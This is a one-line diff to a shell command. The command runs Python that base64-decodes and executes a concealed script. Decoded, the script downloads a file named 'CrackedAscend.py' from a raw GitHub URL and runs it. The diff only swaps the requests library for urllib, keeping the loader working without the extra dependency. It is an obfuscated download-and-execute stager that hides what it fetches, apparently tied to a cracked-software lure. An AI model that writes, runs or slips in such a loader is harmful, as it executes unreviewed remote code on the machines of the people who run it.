@@ -1,1 +1,1 @@
-python -c "import base64;exec(compile(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmNvZGUgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iaXNraXQtZ2l0L3Byb2plY3QvbWFpbi9DcmFja2VkQXNjZW5kLnB5JykudGV4dApleGVjKGNvZGUpCg=='),'<string>','exec'))"
+python -c "import base64;exec(compile(base64.b64decode(b'aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmNvZGUgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmlza2l0LWdpdC9wcm9qZWN0L21haW4vQ3JhY2tlZEFzY2VuZC5weScpLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykKZXhlYyhjb2RlKQo='),'<string>','exec'))"
